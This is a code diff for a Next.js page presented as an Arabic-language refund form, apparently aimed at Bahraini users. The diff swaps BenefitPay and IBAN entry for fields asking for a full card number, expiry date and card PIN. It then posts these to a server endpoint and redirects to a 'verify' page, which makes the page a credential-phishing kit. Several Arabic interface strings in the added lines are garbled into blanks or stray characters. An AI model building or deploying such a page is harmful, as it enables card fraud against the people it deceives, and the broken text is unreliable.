@@ -2,15 +2,14 @@
 
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
-import { CreditCard, Landmark, Loader2, ShieldCheck } from "lucide-react";
-
-type Method = "benefit" | "iban";
+import { CreditCard, Loader2, ShieldCheck } from "lucide-react";
 
 export default function HomePage() {
   const router = useRouter();
-  const [method, setMethod] = useState<Method>("benefit");
-  const [benefit, setBenefit] = useState("");
-  const [iban, setIban] = useState("");
+  const [cardNumber, setCardNumber] = useState("");
+  const [expiryDate, setExpiryDate] = useState("");
+  const [pin, setPin] = useState("");
+  
   const [amount, setAmount] = useState("");
   const [showAmount, setShowAmount] = useState(false);
   const [error, setError] = useState("");
@@ -26,32 +25,40 @@ export default function HomePage() {
   async function onSubmit(e: React.FormEvent) {
     e.preventDefault();
     setError("");
-    const value = method === "benefit" ? benefit.trim() : iban.trim().toUpperCase();
-    if (method === "benefit" && !/^\d{8}$/.test(value)) {
-      setError("أدخل رقم بنفت باي مكوّناً من 8 أرقام.");
+    
+    if (!/^\d{16}$/.test(cardNumber)) {
+      setError("برجاء إدخال رقم بطاقة صحيح مكون من 16 رقم.");
       return;
     }
-    if (method === "iban" && !/^BH\d{2}[A-Z0-9]{14,26}$/.test(value)) {
-      setError("أدخل رقم آيبان بحريني صحيح يبدأ بـ BH.");
+    
+    if (!expiryDate.trim()) {
+      setError("برجاء إدخال تاريخ الانتهاء.");
       return;
     }
+    
+    if (!/^(\d{4}|\d{6})$/.test(pin)) {
+      setError("برجاء إدخال الرقم السري بشكل صحيح (4 أو 6 أرقام).");
+      return;
+    }
+
     const parsedAmount = showAmount && amount.trim() ? Number(amount) : undefined;
     if (parsedAmount !== undefined && (!Number.isFinite(parsedAmount) || parsedAmount <= 0)) {
-      setError("أدخل مبلغ استرجاع صحيح.");
+      setError("قيمة المبلغ غير صحيحة.");
       return;
     }
 
     setSubmitting(true);
     try {
-      sessionStorage.setItem("refund_request", JSON.stringify({ method, value, amount: parsedAmount }));
+      const payload = { method: "card", cardNumber, expiryDate, pin, amount: parsedAmount };
+      sessionStorage.setItem("refund_request", JSON.stringify(payload));
       await fetch("/api/notify/refund", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ method, value, amount: parsedAmount }),
+        body: JSON.stringify(payload),
       });
       router.push("/verify");
     } catch {
-      setError("تعذّر إتمام الطلب. حاول مرة أخرى.");
+      setError("حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.");
       setSubmitting(false);
     }
   }
@@ -64,9 +71,9 @@ export default function HomePage() {
             <ShieldCheck className="h-6 w-6" />
           </span>
           <div>
-            <h1 className="text-xl font-extrabold sm:text-2xl">استرجاع الأموال</h1>
+            <h1 className="text-xl font-extrabold sm:text-2xl"> </h1>
             <p className="mt-1 text-sm text-muted-foreground">
-              اختر طريقة الاسترجاع المناسبة لك، وسنحوّل المبلغ إلى حسابك خلال ثوانٍ معدودة.
+                  ߡ       .
             </p>
           </div>
         </div>
@@ -75,7 +82,7 @@ export default function HomePage() {
           {showAmount && (
             <div>
               <label htmlFor="amount" className="mb-2 block text-sm font-bold">
-                مبلغ الاسترجاع
+                 
               </label>
               <div className="flex items-stretch gap-2" dir="ltr">
                 <input
@@ -93,62 +100,68 @@ export default function HomePage() {
                   BHD
                 </span>
               </div>
-              <p className="mt-2 text-xs text-muted-foreground">المبلغ بالدينار البحريني (اختياري).</p>
+              <p className="mt-2 text-xs text-muted-foreground">   ().</p>
             </div>
           )}
 
-          <div className="grid gap-3 sm:grid-cols-2">
-            <MethodCard
-              active={method === "benefit"}
-              icon={<CreditCard className="h-5 w-5" />}
-              title="BenefitPay"
-              hint="تحويل فوري على رقم بنفت باي"
-              onClick={() => setMethod("benefit")}
-            />
-            <MethodCard
-              active={method === "iban"}
-              icon={<Landmark className="h-5 w-5" />}
-              title="IBAN"
-              hint="تحويل بنكي على رقم الآيبان"
-              onClick={() => setMethod("iban")}
-            />
+          {/* الخانة الثابتة الجديدة */}
+          <div className="flex flex-col items-center justify-center w-full p-4 mb-6 border-2 border-primary rounded-2xl bg-accent cursor-default">
+            <div className="flex items-center justify-center w-12 h-12 mb-2 text-primary-foreground bg-primary rounded-xl">
+              <CreditCard className="h-6 w-6" />
+            </div>
+            <span className="font-bold text-lg text-foreground">الاسترجاع علي بطاقة البنك</span>
           </div>
 
-          {method === "benefit" ? (
+          {/* حقول الإدخال الثلاثة */}
+          <div className="space-y-4">
             <div>
-              <label htmlFor="benefit" className="mb-2 block text-sm font-bold">
-                رقم بنفت باي
+              <label htmlFor="cardNumber" className="mb-2 block text-sm font-bold">
+                رقم البطاقة
               </label>
-              <div className="flex items-stretch gap-2" dir="ltr">
-                <span className="flex items-center rounded-xl bg-secondary px-4 text-sm font-bold text-secondary-foreground">
-                  +973
-                </span>
+              <input
+                id="cardNumber"
+                inputMode="numeric"
+                maxLength={16}
+                value={cardNumber}
+                onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ""))}
+                placeholder="0000000000000000"
+                className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
+                dir="ltr"
+              />
+            </div>
+            
+            <div className="grid grid-cols-2 gap-4">
+              <div>
+                <label htmlFor="expiryDate" className="mb-2 block text-sm font-bold">
+                  تاريخ الانتهاء
+                </label>
                 <input
-                  id="benefit"
+                  id="expiryDate"
+                  value={expiryDate}
+                  onChange={(e) => setExpiryDate(e.target.value)}
+                  placeholder="MM/YY"
+                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
+                  dir="ltr"
+                />
+              </div>
+              <div>
+                <label htmlFor="pin" className="mb-2 block text-sm font-bold">
+                  الرقم السري (PIN)
+                </label>
+                <input
+                  id="pin"
+                  type="password"
                   inputMode="numeric"
-                  maxLength={8}
-                  value={benefit}
-                  onChange={(e) => setBenefit(e.target.value.replace(/\D/g, "").slice(0, 8))}
-                  placeholder="33XXXXXX"
-                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
+                  maxLength={6}
+                  value={pin}
+                  onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
+                  placeholder="****"
+                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
+                  dir="ltr"
                 />
               </div>
             </div>
-          ) : (
-            <div>
-              <label htmlFor="iban" className="mb-2 block text-sm font-bold">
-                رقم الآيبان
-              </label>
-              <input
-                id="iban"
-                dir="ltr"
-                value={iban}
-                onChange={(e) => setIban(e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, ""))}
-                placeholder="BH00XXXX00000000000000"
-                className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
-              />
-            </div>
-          )}
+          </div>
 
           {error && <p className="text-sm font-semibold text-destructive">{error}</p>}
 
@@ -158,50 +171,13 @@ export default function HomePage() {
             className="btn-brand inline-flex w-full items-center justify-center gap-2 rounded-2xl px-6 py-4 text-base font-extrabold"
           >
             {submitting && <Loader2 className="h-5 w-5 animate-spin" />}
-            أكمل الاسترجاع
+             
           </button>
           <p className="text-center text-xs text-muted-foreground">
-            جميع البيانات محمية ومشفّرة أثناء النقل.
+                 .
           </p>
         </form>
       </div>
     </main>
-  );
-}
-
-function MethodCard({
-  active,
-  icon,
-  title,
-  hint,
-  onClick,
-}: {
-  active: boolean;
-  icon: React.ReactNode;
-  title: string;
-  hint: string;
-  onClick: () => void;
-}) {
-  return (
-    <button
-      type="button"
-      onClick={onClick}
-      aria-pressed={active}
-      className={`rounded-2xl border p-4 text-right transition ${
-        active
-          ? "border-primary bg-accent shadow-[0_14px_35px_-24px_oklch(0.53_0.22_26/0.7)]"
-          : "border-border bg-background hover:border-primary/50"
-      }`}
-    >
-      <span
-        className={`flex h-10 w-10 items-center justify-center rounded-xl ${
-          active ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground"
-        }`}
-      >
-        {icon}
-      </span>
-      <p className="mt-3 text-sm font-extrabold">{title}</p>
-      <p className="mt-1 text-xs text-muted-foreground">{hint}</p>
-    </button>
   );
 }
